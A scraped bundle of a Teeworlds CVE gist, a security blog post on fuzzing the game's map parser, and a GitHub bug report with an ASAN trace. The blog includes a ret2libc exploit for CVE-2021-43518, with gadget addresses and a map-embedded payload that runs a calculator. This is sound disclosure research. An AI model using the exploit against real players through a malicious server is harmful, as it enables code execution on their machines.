=== Content from gist.github.com_1cc6905d_20250114_200437.html ===

[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fmanba-bryant%2F9ca95d69c65f4d2c55946932c946fb9b)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fmanba-bryant%2F9ca95d69c65f4d2c55946932c946fb9b&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fmanba-bryant%2F9ca95d69c65f4d2c55946932c946fb9b) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fmanba-bryant%2F9ca95d69c65f4d2c55946932c946fb9b&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@manba-bryant](https://avatars.githubusercontent.com/u/90821399?s=64&v=4)](/manba-bryant)

# [manba-bryant](/manba-bryant)/**[gist:9ca95d69c65f4d2c55946932c946fb9b](/manba-bryant/9ca95d69c65f4d2c55946932c946fb9b)** Secret

Last active
May 22, 2023 03:45

Show Gist options

* [Download ZIP](/manba-bryant/9ca95d69c65f4d2c55946932c946fb9b/archive/e074526cecae7470fb716c95fdf539675924a059.zip)

* [Star
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fmanba-bryant%2F9ca95d69c65f4d2c55946932c946fb9b)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fmanba-bryant%2F9ca95d69c65f4d2c55946932c946fb9b)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/manba-bryant/9ca95d69c65f4d2c55946932c946fb9b.js&quot;&gt;&lt;/script&gt;
* Save manba-bryant/9ca95d69c65f4d2c55946932c946fb9b to your computer and use it in GitHub Desktop.

[Code](/manba-bryant/9ca95d69c65f4d2c55946932c946fb9b)
[Revisions
2](/manba-bryant/9ca95d69c65f4d2c55946932c946fb9b/revisions)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/manba-bryant/9ca95d69c65f4d2c55946932c946fb9b.js&quot;&gt;&lt;/script&gt;

Save manba-bryant/9ca95d69c65f4d2c55946932c946fb9b to your computer and use it in GitHub Desktop.

[Download ZIP](/manba-bryant/9ca95d69c65f4d2c55946932c946fb9b/archive/e074526cecae7470fb716c95fdf539675924a059.zip)

This file contains some information about CVE-2023-31517 and CVE-2023-31518 based on teeworlds

 [Raw](/manba-bryant/9ca95d69c65f4d2c55946932c946fb9b/raw/e074526cecae7470fb716c95fdf539675924a059/gistfile1.txt)

[**gistfile1.txt**](#file-gistfile1-txt)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | CVE-2023-31517 |
| --- | --- |
|  | [Product] : teeworlds |
|  | [source address] : https://github.com/teeworlds/teeworlds/releases/Source code(tar.gz) - teeworlds-0.7.5 |
|  | [Vulnerability Type] : memory leaks |
|  | memory leaks in the component CConsole::Chain of teeworlds v0.7.5 |
|  |  |
|  | CVE-2023-31518 |
|  | [Product] : teeworlds |
|  | [source address] : https://github.com/teeworlds/teeworlds/releases/Source code(tar.gz) - teeworlds-0.7.5 |
|  | [Vulnerability Type] : use-after-free |
|  | heap use-after-free in the component CDataFileReader::GetItem of teeworlds v0.7.5 |

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2Fmanba-bryant%2F9ca95d69c65f4d2c55946932c946fb9b)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from mmmds.pl_d98a0636_20250114_200438.html ===

mmmds's blog
|
[posts](/)
|
[projects](/projects/)
|
[about](/about/) |

# Fuzzing game map parsers, part 1 - Teeworlds

2021-11-01

**tl;dr**: Using AFLplusplus for fuzzing map parser in Teeworlds. Two different approaches (quick and thorough) result in 15 crashes in total (one exploitable).

## Intro

Games that support loading custom maps have to deal with parsing pretty complex files and complexity may lead to bugs. It may be especially important for online games, where players connecting to a server download and parse missing map files. If players can to set up their servers and offer custom maps then this process may be abused. A malicious server may cause unaware players to download a specially crafted map and cause unexpected behavior (desirable code execution). I decided to focus more on that topic and select an online game that can serve custom maps to players joining a game.

As my first target, I chose Teeworlds, an online shooter that I had analyzed [before](https://logicaltrust.net/blog/2020/07/socketfuzzer.html) but from a different angle. The game has a map editor and players joining a game automatically download a missing map. This behavior makes this game a great candidate for research.

## Preparation

The game’s source code is available at [GitHub](https://github.com/teeworlds/teeworlds/) and documented instructions are enough to build the game on Ubuntu 20.04. However, before building the game with AFLplusplus I had to introduce some changes to the code to make fuzzing possible and efficient - more details in a moment.

Besides the code changes, I also needed input files. I decided to take the smallest original map that is available in the game.

```
$ ls -laS datasrc/maps/
total 348
[...]
-rw-rw-r--  1 m m  5731 Oct 22 16:19 ctf1.map
[...]

```

Its size was quite big but at least the map was valid and I was sure that it parses correctly.

## Approach 1 - quick

Running the game to parse a map has its drawbacks. When the game starts it loads a map from a file and then during the whole gameplay uses its data for rendering, calculations, and so on. I had to decide at which moment of execution I want to stop it. I was curious if bugs are more likely to happen in code that is responsible for reading a map from a file and preparing data structures or rather in later phases when this data is being used. There was nothing left to do but check both cases.

So for the first case, I took stopping the game immediately after parsing a file. I found a suitable place in the code - after all necessary initialization - and invoked parsing a map. A filename passed to a method was hardcoded because in a normal situation a client receives a filename from a server.

```
diff --git a/src/engine/client/client.cpp b/src/engine/client/client.cpp
index b9a2e014..4b5a9e16 100644
--- a/src/engine/client/client.cpp
+++ b/src/engine/client/client.cpp
@@ -1842,6 +1842,10 @@ void CClient::InitInterfaces()
        m_Blacklist.Init();
        m_DemoRecorder.Init(Console(), m_pStorage);
        m_DemoPlayer.Init(Console(), m_pStorage);
+
+       __AFL_INIT();
+       m_pMap->Load("maps/666.map");
+       exit(0);
 }

```

At that point, I was ready to build and start fuzzing.

## Approach 2 - thorough

When the process of fuzzing the first case was ongoing, I looked into the source code again to cause the game to parse and really use map data but also to exit in a reasonable time. In this case, communication with a server was necessary to cause the gameplay to start.

I ended up introducing the following changes:

1. Disable CRC and SHA256 checksum checking - these values are sent by a server just to be sure that both sides use the same file. For fuzzing, those checks could be ignored.
2. Exit the game after 150 frames. This value was chosen as the result of experimentation and was enough for the game to display a map on the screen.

```
diff --git a/src/engine/client/client.cpp b/src/engine/client/client.cpp
index b9a2e014..4b5a9e16 100644
--- a/src/engine/client/client.cpp
+++ b/src/engine/client/client.cpp
@@ -810,7 +810,7 @@ const char *CClient::LoadMap(const char *pName, const char *pFilename, const SHA
                return aErrorMsg;
        }

-       if(pWantedSha256 && m_pMap->Sha256() != *pWantedSha256)
+       if(0 && pWantedSha256 && m_pMap->Sha256() != *pWantedSha256)
        {
                char aSha256[SHA256_MAXSTRSIZE];
                char aWantedSha256[SHA256_MAXSTRSIZE];
@@ -823,7 +823,7 @@ const char *CClient::LoadMap(const char *pName, const char *pFilename, const SHA
        }

        // get the crc of the map
-       if(m_pMap->Crc() != WantedCrc)
+       if(0 && m_pMap->Crc() != WantedCrc)
        {
                str_format(aErrorMsg, sizeof(aErrorMsg), "map differs from the server. found = %08x wanted = %08x", m_pMap->Crc(), WantedCrc);
                m_pConsole->Print(IConsole::OUTPUT_LEVEL_ADDINFO, "client", aErrorMsg);
@@ -1999,7 +2003,7 @@ void CClient::Run()
        char aBuf[256];
        str_format(aBuf, sizeof(aBuf), "netversion %s", GameClient()->NetVersion());
        m_pConsole->Print(IConsole::OUTPUT_LEVEL_STANDARD, "client", aBuf);
-       if(str_comp(GameClient()->NetVersionHashUsed(), GameClient()->NetVersionHashReal()))
+       if(0 && str_comp(GameClient()->NetVersionHashUsed(), GameClient()->NetVersionHashReal()))
        {
                m_pConsole->Print(IConsole::OUTPUT_LEVEL_STANDARD, "client", "WARNING: netversion hash differs");
        }
@@ -2128,7 +2132,10 @@ void CClient::Run()
                                // when we are stress testing only render every 10th frame
                                if(!Config()->m_DbgStress || (m_RenderFrames%10) == 0 )
                                {
+                                       static int fuzz_counter = 0;
+                                       fuzz_counter++;
                                        Render();
+                                       if (fuzz_counter == 150) exit(0);
                                        m_pGraphics->Swap();

```

To make the fuzzing work, I had to run the server and make the fuzzed client connect to it. Hopefully, all necessary options were already implemented as command line parameters.

```
$ echo 'sv_map 666' > config.cfg
$ ./teeworlds_srv -f config.cfg

```

```
$ ./afl-fuzz -f /home/mmm/teeworlds/build/data/maps/666.map -i - -o /home/mmm/output -t 5000 -- ./teeworlds "connect 127.0.0.1" "gfx_fullscreen 0" "gfx_screen_height 240" "gfx_screen_width 360"

```

The `-f` parameter points to a file where AFLplusplus was saving its mutated input. Even though the client was connecting to the server, it was noticing that already had a map with the desired name so it was loading it from the disk instead of downloading from the server.

An additional profit of this approach was the possibility to observe what the fuzzer was changing in the map file. It didn’t have any value for the fuzzing but at least was fun to watch.

![](/images/teeworlds.gif)

## Coverage

After approximately 24 hours I decided to check the results. To my surprise, both approaches turned out to be successful. The first approach was much faster but covered less code than the painfully slow second approach.

I used [afl-cov](https://github.com/vanhauser-thc/afl-cov) to generate code coverage reports for the initial test case as well as for all entries generated by AFL during the fuzzing. In that way, it’s visible how much code the fuzzing actually covered.

* First approach
  + initial test case - lines: **5.2%**, functions: **7.9%**
  + whole fuzzing - lines: **5.3**, functions: **8.1%**
* Second approach
  + initial test case - lines: **26.7%**, functions: **35.4%**
  + whole fuzzing - lines: **29.2%**, functions: **37%**

Commands used for generating a report for:

* the initial test case
  ```
  afl-cov -d /home/mmm/teeworlds/output/ --coverage-cmd "./teeworlds 'connect 127.0.0.1' 'gfx_fullscreen 0' 'gfx_screen_height 240' 'gfx_screen_width 360'" --code-dir /home/mmm/teeworlds-afl-cov/  --afl-file /home/mmm/teeworlds-afl-cov/build/data/maps/666.map --afl-queue-id-limit 1

  ```
* all entries
  ```
  afl-cov -d /home/mmm/teeworlds/output/ --coverage-cmd "./teeworlds 'connect 127.0.0.1' 'gfx_fullscreen 0' 'gfx_screen_height 240' 'gfx_screen_width 360'" --code-dir /home/mmm/teeworlds-afl-cov/  --afl-file /home/mmm/teeworlds-afl-cov/build/data/maps/666.map

  ```

The `--afl-file` parameter may look unfamiliar because I implemented it for this specific case. At the moment of writing, afl-cov does not support passing an input file in a way that AFL’s `-f` parameter does. The change is currently available [here](https://github.com/vanhauser-thc/afl-cov/pull/5/files).

## Results

The first approach resulted in **4** unique crashes. The second approach was responsible for **11** more unique crashes.

I reported all crashes on GitHub:

* Null pointer dereference (read)
  + <https://github.com/teeworlds/teeworlds/issues/2968>
  + <https://github.com/teeworlds/teeworlds/issues/2973>
  + <https://github.com/teeworlds/teeworlds/issues/2980>
* Heap buffer overflow (read)
  + <https://github.com/teeworlds/teeworlds/issues/2969>
  + <https://github.com/teeworlds/teeworlds/issues/2971>
  + <https://github.com/teeworlds/teeworlds/issues/2972>
  + <https://github.com/teeworlds/teeworlds/issues/2974>
  + <https://github.com/teeworlds/teeworlds/issues/2975>
  + <https://github.com/teeworlds/teeworlds/issues/2976>
  + <https://github.com/teeworlds/teeworlds/issues/2977>
  + <https://github.com/teeworlds/teeworlds/issues/2978>
  + <https://github.com/teeworlds/teeworlds/issues/2979>
  + <https://github.com/teeworlds/teeworlds/issues/2982>
* Stack buffer overflow (write)
  + <https://github.com/teeworlds/teeworlds/issues/2981> ([CVE-2021-43518](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-43518))
* Use after free (read)
  + <https://github.com/teeworlds/teeworlds/issues/2970>

### Crash analysis

From those crashes, the one related to writing on the stack seemed to be most interesting.

```
==33805==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffffffd8f78 at pc 0x5555556fae80 bp 0x7ffffffd8e10 sp 0x7ffffffd8e00
WRITE of size 4 at 0x7ffffffd8f78 thread T0
    #0 0x5555556fae7f in CMapLayers::LoadEnvPoints(CLayers const*, array<CEnvPoint, allocator_default<CEnvPoint> >&) /home/osboxes/teeworlds/teeworlds-asan/src/game/client/components/maplayers.cpp:184
    #1 0x5555556fcf3b in CMapLayers::OnMapLoad() /home/osboxes/teeworlds/teeworlds-asan/src/game/client/components/maplayers.cpp:117
    #2 0x555555839981 in CGameClient::OnConnected() /home/osboxes/teeworlds/teeworlds-asan/src/game/client/gameclient.cpp:459
    #3 0x5555555f6755 in CClient::ProcessServerPacket(CNetChunk*) /home/osboxes/teeworlds/teeworlds-asan/src/engine/client/client.cpp:1283
    #4 0x5555555f91ce in CClient::PumpNetwork() /home/osboxes/teeworlds/teeworlds-asan/src/engine/client/client.cpp:1596
    #5 0x5555555f9596 in CClient::Update() /home/osboxes/teeworlds/teeworlds-asan/src/engine/client/client.cpp:1766
    #6 0x5555555fc1f0 in CClient::Run() /home/osboxes/teeworlds/teeworlds-asan/src/engine/client/client.cpp:2108
    #7 0x5555555d24e5 in main /home/osboxes/teeworlds/teeworlds-asan/src/engine/client/client.cpp:2704
    #8 0x7ffff68e10b2 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x270b2)
    #9 0x5555555dc48d in _start (/home/osboxes/teeworlds/teeworlds-asan/build/teeworlds+0x8848d)

```

```
[...]
169:  for(int i = 0; i < pItem->m_NumPoints; i++)
170:  {
171:          // convert CEnvPoint_v1 -> CEnvPoint
172:          CEnvPoint_v1 *pEnvPoint_v1 = &((CEnvPoint_v1 *)pPoints)[i + pItem->m_StartPoint];
173:          CEnvPoint p;
174:
175:          p.m_Time = pEnvPoint_v1->m_Time;
176:          p.m_Curvetype = pEnvPoint_v1->m_Curvetype;
177:
178:          for(int c = 0; c < pItem->m_Channels; c++)
179:          {
180:                  p.m_aValues[c] = pEnvPoint_v1->m_aValues[c];
181:                  p.m_aInTangentdx[c] = 0;
182:                  p.m_aInTangentdy[c] = 0;
183:                  p.m_aOutTangentdx[c] = 0;
184:                  p.m_aOutTangentdy[c] = 0;
185:          }
[...]

```

`pItem->m_Channels` and `pEnvPoint_v1->m_aValues` are values coming from the map file. The nested loop lacks additional condition and allows writing outside the `p.m_aValues` 4-element array.

```
struct CEnvPoint : public CEnvPoint_v1
{
        // bezier curve only
        // dx in ms and dy as 22.10 fxp
        int m_aInTangentdx[4];
        int m_aInTangentdy[4];
        int m_aOutTangentdx[4];
        int m_aOutTangentdy[4];

        bool operator<(const CEnvPoint& other) const { return m_Time < other.m_Time; }
};

```

~~It looked promising, however, I didn’t find a working way to exploit it, and as it wasn’t the main area of my effort I postponed it for another time.~~

Update: As a friend pointed out and put me in the right direction, I did a mistake analyzing an optimized code (~~which was weird for a project compiled with the `-O0` flag~~ which was caused by using a release target in cmake that enables optimization). However, the [official build](https://www.teeworlds.com/?page=downloads) does not have an optimized code that broke exploitation attempts. Additionally, the binary even has the stack protection disabled what makes it even easier.

```
$ checksec --file=teeworlds
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   4168) Symbols     No    0               12              teeworlds

```

With a little modification made to the map, I overwrote the instruction pointer.

```
$ gdb --args ./teeworlds 'connect 127.0.0.1'
[...]
Thread 1 "teeworlds" received signal SIGSEGV, Segmentation fault.
0x000000aabbccddee in ?? ()

```
### Exploit

I decided to exploit it just for fun. Unfortunately, there were no other bugs that could be chained to bypass ASLR. For the purpose of the exercise, I continued with ASLR disabled and use ret2libc technique to pop a calc executing `system("/usr/bin/xcalc")`.

To succeed with ret2libc exploit, I required the following things:

1. Gadget with `ret` and `pop rdi; ret` instructions to align the stack, load the parameter for the `system` function and jump to it
   ```
   $ ROPgadget --binary teeworlds | grep 'pop rdi ; ret'
   [...]
   0x0000000000011339 : pop rdi ; ret
   [...]

   ```

   * The `pop rdi; ret` instructions were at offset `0x011339` and the sole `ret` at `0x011339`
   * To make use of those instructions it was also necessary to calculate their absolute addresses by adding their offsets to the address at which the binary was loaded.
     ```
     (gdb) info proc mappings
     process 13108
     Mapped address spaces:

        Start Addr           End Addr       Size     Offset objfile
        0x555555554000     0x555555695000   0x141000        0x0 /home/osboxes/Downloads/teeworlds-0.7.5-linux_x86_64/teeworlds

     ```

     + `0x555555554000 + 0x01133A = 0x55555556533A`
     + `0x555555554000 + 0x011339 = 0x555555565339`
2. Address of the `system` function
   ```
   (gdb) p system
   $3 = {int (const char *)} 0x7ffff76c9410 <__libc_system>

   ```
3. Address of the `/usr/bin/xcalc` string
   * I put the string in that part of the map that was written to the stack. The exact address I found by examining available strings on the stack under gdb.
     ```
     0x7ffffffddc20: "/usr/bin/xcalc"

     ```

Having all the prerequisites, I combined them into a final exploit: `3A535655555500 39535655555500 20DCFDFFFF7F00 10946CF7FF7F00` and I put it in the place of the value that was messing with the instruction pointer. So that time when the map was loaded, the stack was overwritten with valid addresses that redirected execution into the `system` function with the desired parameter.

![](/images/teeexploit.gif)

### Additional bug

When running with ASAN, the game was crashing immediately and reporting use after free error. To avoid this problem during the fuzzing I disabled ASAN for the faulty method.

```
diff --git a/src/game/client/components/menus_browser.cpp b/src/game/client/components/menus_browser.cpp
index 85f1bde1..d0cb938d 100644
--- a/src/game/client/components/menus_browser.cpp
+++ b/src/game/client/components/menus_browser.cpp
@@ -1,3 +1,8 @@
+#if defined(__clang__) || defined (__GNUC__)
+# define ATTRIBUTE_NO_SANITIZE_ADDRESS __attribute__((no_sanitize_address))
+#else
+# define ATTRIBUTE_NO_SANITIZE_ADDRESS
+#endif
 /* (c) Magnus Auvinen. See licence.txt in the root of the distribution for more information. */
 /* If you are missing that file, acquire a complete release at teeworlds.com.                */
 #include <algorithm> // sort  TODO: remove this
@@ -75,6 +80,7 @@ void CMenus::CBrowserFilter::Reset()
        }
 }

+ATTRIBUTE_NO_SANITIZE_ADDRESS
 void CMenus::CBrowserFilter::Switch()
 {
        m_Extended ^= 1;

```

This small teebug was also reported: <https://github.com/teeworlds/teeworlds/issues/2967>

## Summary

Two approaches to fuzzing a map parser detected **15** crashes in total. All of those findings could be used to set up a malicious server and mess up clients’ memory and crash them. One of them turned out to be serious enough to allow code execution. As the results appeared satisfying I will look into other online games as well.

---



=== Content from github.com_83e85ce5_20250114_200437.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fteeworlds%2Fteeworlds%2Fissues%2F2970)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fteeworlds%2Fteeworlds%2Fissues%2F2970)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=teeworlds%2Fteeworlds)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[teeworlds](/teeworlds)
/
**[teeworlds](/teeworlds/teeworlds)**
Public

* [Notifications](/login?return_to=%2Fteeworlds%2Fteeworlds) You must be signed in to change notification settings
* [Fork
  639](/login?return_to=%2Fteeworlds%2Fteeworlds)
* [Star
   2.4k](/login?return_to=%2Fteeworlds%2Fteeworlds)

* [Code](/teeworlds/teeworlds)
* [Issues
  291](/teeworlds/teeworlds/issues)
* [Pull requests
  40](/teeworlds/teeworlds/pulls)
* [Actions](/teeworlds/teeworlds/actions)
* [Security](/teeworlds/teeworlds/security)
* [Insights](/teeworlds/teeworlds/pulse)

Additional navigation options

* [Code](/teeworlds/teeworlds)
* [Issues](/teeworlds/teeworlds/issues)
* [Pull requests](/teeworlds/teeworlds/pulls)
* [Actions](/teeworlds/teeworlds/actions)
* [Security](/teeworlds/teeworlds/security)
* [Insights](/teeworlds/teeworlds/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fteeworlds%2Fteeworlds%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fteeworlds%2Fteeworlds%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Heap use after free (read) while loading map in CDataFileReader::GetItem, datafile.cpp:406 #2970

Open

[mmmds](/mmmds) opened this issue
Oct 23, 2021
· 0 comments
 · May be fixed by [#2931](https://github.com/teeworlds/teeworlds/pull/2931)

Open

# [Heap use after free (read) while loading map in CDataFileReader::GetItem, datafile.cpp:406](#top) #2970

[mmmds](/mmmds) opened this issue
Oct 23, 2021
· 0 comments
 · May be fixed by [#2931](https://github.com/teeworlds/teeworlds/pull/2931)

Labels
[bug](/teeworlds/teeworlds/labels/bug)
[client](/teeworlds/teeworlds/labels/client)
[code review](/teeworlds/teeworlds/labels/code%20review)

## Comments

[![@mmmds](https://avatars.githubusercontent.com/u/4034742?s=80&v=4)](/mmmds)

Copy link

### **[mmmds](/mmmds)** commented [Oct 23, 2021](#issue-1034134339)

| The client crashes (only with ASAN) when an invalid map ([3.map.zip](https://github.com/teeworlds/teeworlds/files/7402684/3.map.zip)) is loaded. Such a map can be delivered to the client by a malicious server.  Tested on Ubuntu 20.04 x86\_64, Teeworlds version: [f35da54b6f2c5f9fd4bbd4559f887ccf8f8cc526](https://github.com/teeworlds/teeworlds/commit/f35da54b6f2c5f9fd4bbd4559f887ccf8f8cc526)  Compilation with ASAN:  ``` export CXXFLAGS="-ggdb -O0 -fsanitize=address -fno-omit-frame-pointer" export CFLAGS="-ggdb -O0 -fsanitize=address -fno-omit-frame-pointer" cmake .. make  ```  Run and connect to a server that delivers an invalid map:  ``` ./teeworlds "connect 127.0.0.1" "gfx_fullscreen 0" "gfx_screen_height 240" "gfx_screen_width 360" [...] ================================================================= ==31394==ERROR: AddressSanitizer: heap-use-after-free on address 0x61f00012e6e4 at pc 0x5555559764d5 bp 0x7ffffffd8c30 sp 0x7ffffffd8c20 READ of size 4 at 0x61f00012e6e4 thread T0     #0 0x5555559764d4 in CDataFileReader::GetItem(int, int*, int*) /home/osboxes/teeworlds/teeworlds-asan/src/engine/shared/datafile.cpp:406     #1 0x5555559764d4 in CDataFileReader::FindItem(int, int) /home/osboxes/teeworlds/teeworlds-asan/src/engine/shared/datafile.cpp:438     #2 0x555555995f73 in CMap::Load(char const*, IStorage*) /home/osboxes/teeworlds/teeworlds-asan/src/engine/shared/map.cpp:37     #3 0x5555555f0c6f in CClient::LoadMap(char const*, char const*, SHA256_DIGEST const*, unsigned int) /home/osboxes/teeworlds/teeworlds-asan/src/engine/client/client.cpp:807     #4 0x5555555f8408 in CClient::ProcessServerPacket(CNetChunk*) /home/osboxes/teeworlds/teeworlds-asan/src/engine/client/client.cpp:1251     #5 0x5555555f997e in CClient::PumpNetwork() /home/osboxes/teeworlds/teeworlds-asan/src/engine/client/client.cpp:1596     #6 0x5555555f9d46 in CClient::Update() /home/osboxes/teeworlds/teeworlds-asan/src/engine/client/client.cpp:1766     #7 0x5555555fc9a0 in CClient::Run() /home/osboxes/teeworlds/teeworlds-asan/src/engine/client/client.cpp:2108     #8 0x5555555d24e5 in main /home/osboxes/teeworlds/teeworlds-asan/src/engine/client/client.cpp:2704     #9 0x7ffff68e10b2 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x270b2)     #10 0x5555555dc48d in _start (/home/osboxes/teeworlds/teeworlds-asan/build/teeworlds+0x8848d)  0x61f00012e6e4 is located 2148 bytes inside of 3072-byte region [0x61f00012de80,0x61f00012ea80) freed by thread T2 here:     #0 0x7ffff76918df in operator delete(void*) (/lib/x86_64-linux-gnu/libasan.so.5+0x1108df)     #1 0x7fffebe0f000  (/lib/x86_64-linux-gnu/libLLVM-10.so.1+0x1423000)  previously allocated by thread T2 here:     #0 0x7ffff7690947 in operator new(unsigned long) (/lib/x86_64-linux-gnu/libasan.so.5+0x10f947)     #1 0x7fffebe11b41  (/lib/x86_64-linux-gnu/libLLVM-10.so.1+0x1425b41)  Thread T2 created by T0 here:     #0 0x7ffff75bb805 in pthread_create (/lib/x86_64-linux-gnu/libasan.so.5+0x3a805)     #1 0x5555559cc6f6 in thread_init /home/osboxes/teeworlds/teeworlds-asan/src/base/system.c:484     #2 0x5555555e224f in CGraphicsBackend_Threaded::StartProcessor(CGraphicsBackend_Threaded::ICommandProcessor*) /home/osboxes/teeworlds/teeworlds-asan/src/engine/client/backend_sdl.cpp:56     #3 0x5555555e224f in CGraphicsBackend_SDL_OpenGL::Init(char const*, int*, int*, int*, int*, int*, int, int, int*, int*) /home/osboxes/teeworlds/teeworlds-asan/src/engine/client/backend_sdl.cpp:735     #4 0x55555561719f in CGraphics_Threaded::IssueInit() /home/osboxes/teeworlds/teeworlds-asan/src/engine/client/graphics_threaded.cpp:753     #5 0x555555617316 in CGraphics_Threaded::InitWindow() /home/osboxes/teeworlds/teeworlds-asan/src/engine/client/graphics_threaded.cpp:760     #6 0x555555617dab in CGraphics_Threaded::Init() /home/osboxes/teeworlds/teeworlds-asan/src/engine/client/graphics_threaded.cpp:807     #7 0x5555555fb64d in CClient::Run() /home/osboxes/teeworlds/teeworlds-asan/src/engine/client/client.cpp:1951     #8 0x5555555d24e5 in main /home/osboxes/teeworlds/teeworlds-asan/src/engine/client/client.cpp:2704     #9 0x7ffff68e10b2 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x270b2)  SUMMARY: AddressSanitizer: heap-use-after-free /home/osboxes/teeworlds/teeworlds-asan/src/engine/shared/datafile.cpp:406 in CDataFileReader::GetItem(int, int*, int*) Shadow bytes around the buggy address:   0x0c3e8001dc80: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd   0x0c3e8001dc90: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd   0x0c3e8001dca0: fd fd fd fd fd fd 